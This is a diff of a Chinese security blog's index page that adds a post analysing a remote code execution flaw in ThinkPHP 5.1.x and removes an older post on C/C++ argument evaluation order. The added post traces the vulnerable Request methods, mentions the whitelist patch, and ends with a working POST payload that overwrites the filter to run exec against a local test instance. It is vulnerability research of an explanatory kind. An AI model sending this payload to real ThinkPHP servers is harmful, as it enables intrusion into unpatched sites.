@@ -66,6 +66,154 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2020-01-30T07:35:28.184Z" itemprop="datePublished">2020-01-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p>
+<p>测试环境 5.1.29</p>
+<p><strong>入口处关闭报错</strong> </p>
+<p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p>
+<p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p>
+<p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p>
+<p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p>
+<p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p>
+<p>我们从<code>Request::param</code>处开始分析</p>
+<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        if (!$this-&gt;mergeParam) {
+            $method = $this-&gt;method(true);
+
+            // 自动获取请求变量
+            switch ($method) {
+                case &#39;POST&#39;:
+                    $vars = $this-&gt;post(false);
+                    break;
+                case &#39;PUT&#39;:
+                case &#39;DELETE&#39;:
+                case &#39;PATCH&#39;:
+                    $vars = $this-&gt;put(false);
+                    break;
+                default:
+                    $vars = [];
+            }
+
+            // 当前请求参数和URL地址中的参数合并
+            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
+
+            $this-&gt;mergeParam = true;
+        }
+
+        ...
+    }</code></pre>
+<p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p>
+<pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        if (empty($this-&gt;post)) {
+            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);
+        }
+
+        return $this-&gt;input($this-&gt;post, $name, $default, $filter);
+    }</code></pre>
+<p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p>
+<p>跟进<code>Request::input</code></p>
+<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        ...
+
+        // 解析过滤器
+        $filter = $this-&gt;getFilter($filter, $default);
+
+        if (is_array($data)) {
+            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);
+            reset($data);
+        } else {
+            $this-&gt;filterValue($data, $name, $filter);
+        }
+
+       ...
+    }</code></pre>
+<p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p>
+<p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p>
+<p>跟进去</p>
+<pre><code class="php">private function filterValue(&amp;$value, $key, $filters)
+    {
+        $default = array_pop($filters);
+
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);
+            } elseif (is_scalar($value)) {
+                if (false !== strpos($filter, &#39;/&#39;)) {
+                    // 正则过滤
+                    if (!preg_match($filter, $value)) {
+                        // 匹配不成功返回默认值
+                        $value = $default;
+                        break;
+                    }
+                } elseif (!empty($filter)) {
+                    // filter函数不存在时, 则使用filter_var进行过滤
+                    // filter为非整形值时, 调用filter_id取得过滤id
+                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
+                    if (false === $value) {
+                        $value = $default;
+                        break;
+                    }
+                }
+            }
+        }
+
+        return $value;
+    }</code></pre>
+<p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p>
+<p>且<code>$filter</code>=<code>$_POST</code></p>
+<p>因此有</p>
+<pre><code>http://127.0.0.1/public/
+POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/" target="_blank" rel="noopener">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/](<a href="https://explorersss.github.io/2020/01/30/ThinkPHP">https://explorersss.github.io/2020/01/30/ThinkPHP</a> 5.1.x-5.2.x全版本RCE 漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://explorersss.github.io/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ck60fbzg00000o8v028ts14sq" data-title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
@@ -2102,145 +2250,6 @@ done
 
 
   
-    <article id="post-由cout和printf来对函数传参过程的探讨" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" class="article-date">
-  <time class="dt-published" datetime="2019-12-14T08:37:53.214Z" itemprop="datePublished">2019-12-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/">由cout和printf来对函数传参过程的探讨</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="由cout和printf来对函数传参过程的探讨"><a href="#由cout和printf来对函数传参过程的探讨" class="headerlink" title="由cout和printf来对函数传参过程的探讨"></a>由cout和printf来对函数传参过程的探讨</h1><h2 id="令人疑惑的结果"><a href="#令人疑惑的结果" class="headerlink" title="令人疑惑的结果"></a>令人疑惑的结果</h2><p>来看一个代码吧</p>
-<pre><code class="c++">#include&lt;stdio.h&gt;
-int i=0;
-int update(){i++;return i;}
-int main()
-{
-    printf(&quot;update():%d i:%d\n&quot;,update(),i);
-    return 0;
-}</code></pre>
-<p>你觉得它的输出结果是什么<br><del>update():1 i:1</del> ?<br><strong>错</strong>，正确输出是<code>update():1 i:0</code></p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>为何会如此,先来做个实验康康吧:</p>
-<pre><code class="c++">#include&lt;iostream&gt;
-#include &lt;queue&gt;
-#include&lt;stdio.h&gt; 
-using namespace std;
-int i=0;
-int update(){i++;return i;};
-int main()
-{
-    printf(&quot;----------------------------test printf----------------------------\n&quot;);
-    printf(&quot;before:%d\n&quot;,i);
-    printf(&quot;update():%d i:%d\n&quot;,update(),i);
-    printf(&quot;later:%d\n&quot;,i);
-
-    printf(&quot;before:%d\n&quot;,i);
-    printf(&quot;i:%d update():%d \n&quot;,i,update());
-    printf(&quot;later:%d\n&quot;,i);
-
-    printf(&quot;update1:%d update2:%d update3:%d&quot;,update(),update(),update());
-}</code></pre>
-<p>它的输出结果是</p>
-<pre><code>----------------------------test printf----------------------------
-before:0
-update():1 i:0
-later:1
-before:1
-i:2 update():2
-later:2
-update1:5 update2:4 update3:3</code></pre><p>只有printf是这样的?不，可变参数的打印函数都具有这样的特性<br>我们来测试一下cout来验证一下</p>
-<pre><code class="c++">#include&lt;iostream&gt;
-#include &lt;queue&gt;
-#include&lt;stdio.h&gt; 
-using namespace std;
-int i=0;
-int update(){i++;return i;};
-int main()
-{
-
-    cout&lt;&lt;&quot;---------------------------- test cout ----------------------------\n&quot;;
-    i=0;
-    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;
-    cout&lt;&lt;&quot;update():&quot;&lt;&lt;update()&lt;&lt;&quot; i:&quot;&lt;&lt;i&lt;&lt;endl;
-    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;
-
-    cout&lt;&lt;&quot;before:&quot;&lt;&lt;i&lt;&lt;endl;
-    cout&lt;&lt;&quot;i:&quot;&lt;&lt;i&lt;&lt;&quot; update():&quot;&lt;&lt;update()&lt;&lt;endl;
-    cout&lt;&lt;&quot;later:&quot;&lt;&lt;i&lt;&lt;endl;
-
-    cout&lt;&lt;&quot;update1:&quot;&lt;&lt;update()&lt;&lt;&quot; update2:&quot;&lt;&lt;update()&lt;&lt;&quot; update3:&quot;&lt;&lt;update()&lt;&lt;endl;
-
-}</code></pre>
-<p>它的输出结果是:</p>
-<pre><code>---------------------------- test cout ----------------------------
-before:0
-update():1 i:0
-later:1
-before:1
-i:2 update():2
-later:2
-update1:5 update2:4 update3:3
-</code></pre><h2 id="汇编层面的解释"><a href="#汇编层面的解释" class="headerlink" title="汇编层面的解释"></a>汇编层面的解释</h2><p>为什么会这样,这就必须说起c和c++中关于函数传参的过程了:</p>
-<p>在汇编中函数传参要从最后一个参数到第一个参数分别入栈，这样函数取参数的时候，pop出来的顺序才是1-n。</p>
-<p>因此,在<code>printf(&quot;update():%d i:%d\n&quot;,update(),i);</code>中,函数先压入i,再执行update(),将其返回值压入栈。</p>
-<p>以上只是理论，真实的环境中由x86,x64,32位,16位机,它们的具体的传参方式略有不同:)  </p>
-<p>我们来看一下x64下这一条语句的汇编代码</p>
-<pre><code>mov     ebx, cs:i
-call    _Z6updatev      ; update(void)
-mov     r8d, ebx
-mov     edx, eax
-lea     rcx, aUpdateDID ; &quot;update():%d i:%d\n&quot;
-call    _ZL6printfPKcz  ; printf(char const*,...)</code></pre><p>在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈。</p>
-<p>上述代码中 格式化字符串在rcx中(最后一个赋值),update()返回值在edx,中第二个赋值。i在r8中第一个赋值 。</p>
-<p>但是我们可以看到<code>mov     ebx, cs:i</code>程序先将i的值移动到ebx中，再调用update函数,将返回值所在寄存器eax移动到edx中。</p>
-<p>虽然过程有点变化,但是最后的结果还是和在汇编中函数传参要从最后一个参数到第一个参数分别入栈。</p>
-<h2 id="来练习一下吧"><a href="#来练习一下吧" class="headerlink" title="来练习一下吧"></a>来练习一下吧</h2><p>最后上一个题目吧//</p>
-<pre><code class="c++">#include &lt;stdio.h&gt;
-int main()
-{
-    long long a = 1, b = 2, c = 3;
-    printf(&quot;%d %d %d\n&quot;, a,b,c);
-    return 0;
-}</code></pre>
-<p>求输出</p>
-<p><a href="https://blog.csdn.net/u014713819/article/details/29355455" target="_blank" rel="noopener">答案和解析</a></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/14/由cout和printf来对函数传参过程的探讨/">https://explorersss.github.io/2019/12/14/由cout和printf来对函数传参过程的探讨/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://explorersss.github.io/2019/12/14/%E7%94%B1cout%E5%92%8Cprintf%E6%9D%A5%E5%AF%B9%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E8%BF%87%E7%A8%8B%E7%9A%84%E6%8E%A2%E8%AE%A8/" data-id="ck45lnid500021kv02wm6h2yp" data-title="由cout和printf来对函数传参过程的探讨" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2276,7 +2285,7 @@ int main()
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 16.67px;">小工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 13.33px;">编程</a>
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/cve/" style="font-size: 10px;">cve</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 13.33px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 16.67px;">小工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 13.33px;">编程</a>
     </div>
   </div>
 
@@ -2298,6 +2307,10 @@ int main()
       <ul>
         
           <li>
+            <a href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</a>
+          </li>
+        
+          <li>
             <a href="/2020/01/30/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现</a>
           </li>
         
@@ -2311,10 +2324,6 @@ int main()
         
           <li>
             <a href="/2019/12/22/gxyctf2019/">gxytf2019</a>
-          </li>
-        
-          <li>
-            <a href="/2019/12/21/django%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE/">django快速查找配置</a>
           </li>
         
       </ul>
